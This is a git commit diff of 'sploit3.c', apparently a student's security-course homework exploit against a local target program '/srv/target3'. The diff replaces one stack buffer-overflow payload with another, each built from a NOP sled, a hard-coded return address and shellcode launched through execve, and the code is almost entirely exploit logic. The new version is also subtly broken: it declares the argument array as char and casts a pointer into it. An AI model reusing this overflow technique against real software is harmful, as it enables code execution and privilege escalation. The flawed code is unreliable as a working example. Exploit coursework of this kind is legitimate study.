926403ea1e59511058779f219fe3bd8b87781a51
justinhalford <justinhalford@gmail.com>
2024-05-10 21:08:23 -0400

    may 7

--- cs5435-hw4/sploits/sploit3.c
+++ cs5435-hw4/sploits/sploit3.c
@@ -7,41 +7,21 @@
 
 const char* TARGET = "/srv/target3";
 
-const int ESIZE = 400;
-const uint32_t BASE = 0xffffdec0;
-const int NSIZE = 201;
-const char NOP = 0x90;
-const int DIFF = 4;
-const uint32_t A1 = BASE + DIFF;
-const uint32_t A2 = BASE + 2 * DIFF;
+const char* SLED = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+const char* ADD = "\xc0\xde\xff\xff";
 
-void prep(char *e) {
-    memset(e, NOP, ESIZE - 1);
-    *((uint32_t *)(e)) = A1;
-    *((uint32_t *)(e + DIFF)) = A2;
-    memcpy(e + NSIZE, shellcode, sizeof(shellcode));
-    e[ESIZE - 1] = '\0';
+char* prep() {
+  char* buf = malloc(strlen(SLED) + strlen(ADD) + sizeof(shellcode) + 1);
+  sprintf(buf, "%s%s%s", SLED, ADD, shellcode);
+  return buf;
 }
 
 int main(void) {
-    char env[ESIZE];
-    prep(env); 
+  char args[] = {(char)TARGET, prep(), NULL};
+  char *envp[] = {NULL};
+  if (execve(TARGET, args, envp) == -1) {
+      perror("execve failed");
+  }
 
-    char *buf = malloc(NSIZE + sizeof(shellcode) + 1);
-    if (buf == NULL) {
-        perror("Failed to allocate buf");
-        exit(EXIT_FAILURE);
-    }
-    memset(buf, NOP, NSIZE);
-    memcpy(buf + NSIZE, shellcode, sizeof(shellcode));
-    buf[NSIZE + sizeof(shellcode)] = '\0'; 
-
-    char *args[] = {TARGET, buf, NULL};
-    char *envp[] = {env};
-
-    if (execve(TARGET, args, envp) == -1) {
-        perror("execve failed");
-    }
-
-    return 0;
+  return 0;
 }
